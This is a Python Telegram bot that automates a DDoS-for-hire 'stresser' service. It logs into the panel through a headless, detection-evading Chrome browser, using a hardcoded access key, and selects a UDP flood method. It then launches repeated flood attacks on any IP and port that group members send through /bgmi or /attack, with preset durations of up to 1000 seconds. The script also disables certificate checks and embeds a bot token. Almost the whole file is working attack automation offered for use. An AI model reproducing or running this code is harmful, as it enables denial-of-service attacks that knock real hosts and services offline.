import asyncio
import time
import threading
import ssl
import urllib3
import os
import re
import subprocess
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# SSL Fix
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TOKEN = "8947172357:AAEm-XyXU-B5TV1xcZoOIZJMmk8KQQXQXQM"
ALLOWED_GROUP_ID = -5518975872

is_attacking = False
stop_attack = False
driver = None
is_logged_in = False

ACCESS_KEY = "687bdda5c85a487bbac4082523058bc518ca1eb6f4dc4b5cbcc38f30c2491d1e"

def close_browser():
    global driver
    if driver:
        try:
            driver.quit()
        except:
            pass
        driver = None


from selenium.webdriver import ActionChains

def safe_click(driver, element):
    try:
        driver.execute_script("arguments[0].scrollIntoView({block: 'center', inline: 'center'});", element)
        time.sleep(0.5)
        element.click()
        return True
    except Exception:
        pass

    try:
        driver.execute_script("arguments[0].click();", element)
        return True
    except Exception:
        pass

    try:
        ActionChains(driver).move_to_element(element).click(element).perform()
        return True
    except Exception:
        return False


def set_element_value(driver, element, value):
    driver.execute_script(
        "arguments[0].value = arguments[1]; arguments[0].dispatchEvent(new Event('input', { bubbles: true })); arguments[0].dispatchEvent(new Event('change', { bubbles: true }));",
        element,
        value,
    )


def click_and_verify(driver, element, verify_xpath=None, timeout=10):
    if not safe_click(driver, element):
        return False
    if verify_xpath:
        try:
            WebDriverWait(driver, timeout).until(EC.presence_of_element_located((By.XPATH, verify_xpath)))
            return True
        except Exception:
            return False
    return True


def init_browser():
    global driver
    close_browser()
    
    try:
        import certifi
        os.environ.setdefault('SSL_CERT_FILE', certifi.where())
    except:
        pass

    options = uc.ChromeOptions()
    options.add_argument("--headless=new")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--start-maximized")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-gpu")
    options.add_argument("--ignore-certificate-errors")
    options.add_argument("--ignore-ssl-errors")
    options.add_argument("--disable-dev-shm-usage")

    chrome_version = None
    for browser_cmd in ["google-chrome", "chromium", "chromium-browser"]:
        try:
            version_output = subprocess.check_output([browser_cmd, "--version"], stderr=subprocess.STDOUT, text=True)
            match = re.search(r"(\d+)\.", version_output)
            if match:
                chrome_version = int(match.group(1))
                break
        except Exception:
            continue

    driver_kwargs = {
        "options": options,
        "use_subprocess": True,
    }
    if chrome_version is not None:
        driver_kwargs["version_main"] = chrome_version

    driver = uc.Chrome(**driver_kwargs)
    return driver

def full_login_setup():
    global driver, is_logged_in
    try:
        print("🔄 Engine chalu hora ...")
        drv = init_browser()
        wait = WebDriverWait(drv, 30)
        
        drv.get("https://retrostress.st/auth")
        time.sleep(8)
        
        key_field = wait.until(EC.presence_of_element_located((By.ID, "accessKey")))
        key_field.clear()
        key_field.send_keys(ACCESS_KEY)
        
        auth_btn = wait.until(EC.element_to_be_clickable((By.ID, "loginSubmitBtn")))
        safe_click(drv, auth_btn)
        time.sleep(12)
        
        drv.get("https://retrostress.st/panel")
        time.sleep(10)
        
        udp_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'UDP')]")))
        if not click_and_verify(drv, udp_btn, "//button[contains(text(), 'UDP') and contains(@class, 'active')]"):
            print('Warning: UDP button select may not be active')
        time.sleep(5)
        
        trigger = wait.until(EC.element_to_be_clickable((By.CLASS_NAME, "ct-combo-trigger")))
        safe_click(drv, trigger)
        time.sleep(4)
        
        big_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'UDP-BIG')]")))
        if not click_and_verify(drv, big_btn, "//button[contains(., 'UDP-BIG') and contains(@class, 'active')]"):
            print('Warning: UDP-BIG button may not be active, retrying click')
            safe_click(drv, big_btn)
            time.sleep(3)
        
        is_logged_in = True
        print("✅ Engine chalu hogya")
        return True
    except Exception as e:
        print("Setup Error:", str(e))
        is_logged_in = False
        return False

def launch_attack(ip, port):
    if not driver:
        print("Launch error: no browser session available")
        return False

    try:
        wait = WebDriverWait(driver, 20)
        ip_field = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input.ct-input")))
        ip_field.clear()
        ip_field.send_keys(ip)
        set_element_value(driver, ip_field, ip)
        
        port_field = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='number']")))
        port_field.clear()
        port_field.send_keys(str(port))
        set_element_value(driver, port_field, str(port))
        
        try:
            btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button.ct-launch")))
        except Exception:
            btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button.btn-primary")))
        clicked = safe_click(driver, btn)
        if not clicked:
            raise Exception("Attack launch button click failed")
        time.sleep(2)
        return True
    except Exception as e:
        print("Launch error:", str(e))
        return False

def run_attacks(ip, port, duration_seconds, chat_id, bot, loop):
    global is_attacking, stop_attack
    stop_attack = False
    try:
        num_attacks = max(1, duration_seconds // 30)
        for i in range(num_attacks):
            if stop_attack:
                send_message_threadsafe(bot, chat_id, "🛑 Attack Stopped", loop)
                break

            success = False
            max_retries = 3
            for attempt in range(1, max_retries + 1):
                success = launch_attack(ip, port)
                if success:
                    break
                if attempt < max_retries:
                    send_message_threadsafe(bot, chat_id, f"⚠️ Retry {attempt}/{max_retries} failed for {ip}:{port}, retrying...", loop)
                    time.sleep(2)

            if not success:
                send_message_threadsafe(bot, chat_id, f"❌ Attack {i+1}/{num_attacks} failed after {max_retries} retries.", loop)
                is_attacking = False
                break

            send_message_threadsafe(bot, chat_id, f"🔄 Attack {i+1}/{num_attacks} → {ip}:{port}", loop)
            start = time.time()
            while time.time() - start < 30:
                time.sleep(0.5)
                if stop_attack:
                    break
        else:
            if not stop_attack:
                send_message_threadsafe(bot, chat_id, "✅ All attacks launched successfully.", loop)
    finally:
        is_attacking = False

def send_message_threadsafe(bot, chat_id, text, loop):
    try:
        future = asyncio.run_coroutine_threadsafe(bot.send_message(chat_id=chat_id, text=text), loop)
        future.result(timeout=10)
    except:
        pass

# ===================== COMMANDS =====================
async def start_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🚀 *Welcome to RetroStress Bot*

Use the buttons below for a faster workflow.

*Commands:*
• `/bgmi <ip> <port>` → Start Attack
• `/attack <ip> <port>` → Start Attack (alias)
• `/stop` → Stop Current Attack
• `/restart` → Restart Browser + Login
• `/status` → Show connection and attack status
• `/menu` → Show quick command buttons

*Features:*
• Auto Login + UDP-BIG
• Real-time Status
• Friendly bot UI
"""
    keyboard = [
        [KeyboardButton('/bgmi')],
        [KeyboardButton('/attack')],
        [KeyboardButton('/stop'), KeyboardButton('/status')],
        [KeyboardButton('/restart'), KeyboardButton('/menu')],
        [KeyboardButton('/speed')]
    ]
    await update.message.reply_text(
        help_text,
        parse_mode='Markdown',
        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
    )

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attacking
    if update.message.chat.id != ALLOWED_GROUP_ID:
        return
    if is_attacking:
        await update.message.reply_text("⏳ Attack already running! Use /stop")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /bgmi <ip> <port>\nExample: /bgmi 1.2.3.4 80")
        return

    ip = context.args[0]
    port = context.args[1]

    keyboard = [
        [InlineKeyboardButton("100 sec", callback_data=f"atk_{ip}_{port}_100")],
        [InlineKeyboardButton("200 sec", callback_data=f"atk_{ip}_{port}_200")],
        [InlineKeyboardButton("400 sec", callback_data=f"atk_{ip}_{port}_400")],
        [InlineKeyboardButton("700 sec", callback_data=f"atk_{ip}_{port}_700")],
        [InlineKeyboardButton("1000 sec", callback_data=f"atk_{ip}_{port}_1000")]
    ]

    await update.message.reply_text(
        f"⚔️ *Attack ready!*\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"Choose duration:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    status_text = (
        f"📌 *Bot Status*\n"
        f"• Logged in: {'✅' if is_logged_in else '❌'}\n"
        f"• Attack running: {'✅' if is_attacking else '❌'}\n"
        f"• Group access: {ALLOWED_GROUP_ID}\n"
    )
    await update.message.reply_text(status_text, parse_mode='Markdown')

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_attack
    if not is_attacking:
        await update.message.reply_text("❌ No attack is running.")
        return
    stop_attack = True
    await update.message.reply_text("🛑 Stopping current attack...")

async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attacking, is_logged_in
    if is_attacking:
        await update.message.reply_text("⏳ Cannot restart during attack.")
        return
    is_logged_in = False
    success = full_login_setup()
    if success:
        await update.message.reply_text("✅ Restart successful.")
    else:
        await update.message.reply_text("❌ Restart failed.")

async def menu_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Start Attack", callback_data="menu_bgmi")],
        [InlineKeyboardButton("Stop Attack", callback_data="menu_stop")],
        [InlineKeyboardButton("Restart Bot", callback_data="menu_restart")],
        [InlineKeyboardButton("Status", callback_data="menu_status")],
        [InlineKeyboardButton("Speed Test", callback_data="menu_speed")]
    ]
    await update.message.reply_text(
        "Select an action from the menu below:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attacking
    query = update.callback_query
    await query.answer()
    if query.data.startswith("atk_"):
        if is_attacking:
            await query.edit_message_text("Already running!")
            return
        _, ip, port, dur = query.data.split("_")
        duration = int(dur)
        is_attacking = True
        await query.edit_message_text(f"🚀 Launching {duration}s attack on {ip}:{port}...")
        loop = asyncio.get_running_loop()
        threading.Thread(target=run_attacks, args=(ip, port, duration, query.message.chat_id, context.bot, loop), daemon=True).start()
    elif query.data == "menu_bgmi":
        await query.edit_message_text("Use /bgmi <ip> <port> to start an attack:\nExample: /bgmi 1.2.3.4 80")
    elif query.data == "menu_stop":
        await query.edit_message_text("Send /stop to stop the running attack.")
    elif query.data == "menu_restart":
        await query.edit_message_text("Send /restart to restart the bot login session.")
    elif query.data == "menu_status":
        await query.edit_message_text(
            f"📌 Bot Status:\n• Logged in: {'✅' if is_logged_in else '❌'}\n• Attack running: {'✅' if is_attacking else '❌'}"
        )
    elif query.data == "menu_speed":
        await query.edit_message_text("Send /speed to run an internet speed test. This may take ~30-60s.")


async def speed_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat.id != ALLOWED_GROUP_ID:
        return
    await update.message.reply_text("⏳ Running speed test... This may take a while.")
    loop = asyncio.get_running_loop()
    threading.Thread(target=run_speedtest_thread, args=(update.message.chat.id, context.bot, loop), daemon=True).start()


def run_speedtest_thread(chat_id, bot, loop):
    try:
        try:
            import speedtest as st
            s = st.Speedtest()
            s.get_best_server()
            d = s.download()
            u = s.upload(pre_allocate=False)
            ping = s.results.ping if hasattr(s, 'results') and s.results else getattr(s, 'results', {}).get('ping', 0)
            dl = d / 1e6
            ul = u / 1e6
            res = f"📶 Speed Test Results\n• Download: {dl:.2f} Mbps\n• Upload: {ul:.2f} Mbps\n• Ping: {ping:.2f} ms"
        except Exception:
            # Fallback to command-line tools
            try:
                out = subprocess.check_output(["speedtest-cli", "--simple"], stderr=subprocess.STDOUT, text=True)
                m_ping = re.search(r"Ping:\s*([\d.]+)\s*ms", out)
                m_dl = re.search(r"Download:\s*([\d.]+)\s*Mbit/s", out)
                m_ul = re.search(r"Upload:\s*([\d.]+)\s*Mbit/s", out)
                if m_dl and m_ul and m_ping:
                    res = f"📶 Speed Test Results\n• Download: {float(m_dl.group(1)):.2f} Mbps\n• Upload: {float(m_ul.group(1)):.2f} Mbps\n• Ping: {float(m_ping.group(1)):.2f} ms"
                else:
                    # Try Ookla speedtest CLI (JSON)
                    try:
                        out2 = subprocess.check_output(["speedtest", "--accept-license", "--accept-gdpr", "-f", "json"], text=True)
                        import json
                        jd = json.loads(out2)
                        dl = jd.get("download", 0) / 1e6
                        ul = jd.get("upload", 0) / 1e6
                        ping = jd.get("ping", 0)
                        server = jd.get("server", {}).get("sponsor", "")
                        res = f"📶 Speed Test Results\n• Download: {dl:.2f} Mbps\n• Upload: {ul:.2f} Mbps\n• Ping: {ping:.2f} ms\n• Server: {server}"
                    except Exception:
                        res = "⚠️ Speed test failed: no speedtest tool available. Install `speedtest-cli` or `speedtest` CLI."
            except Exception:
                res = "⚠️ Speed test failed: unable to run fallback speedtest."
    except Exception as e:
        res = f"⚠️ Speed test encountered an error: {str(e)}"

    send_message_threadsafe(bot, chat_id, res, loop)


def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start_help))
    app.add_handler(CommandHandler("help", start_help))
    app.add_handler(CommandHandler("menu", menu_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("attack", bgmi))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("restart", restart_command))
    app.add_handler(CommandHandler("speed", speed_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("🤖 Bot Started Successfully! Use /help")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        app.run_polling()
    finally:
        loop.close()

if __name__ == "__main__":
    print("🔧 Starting Bot...")
    full_login_setup()
    main()
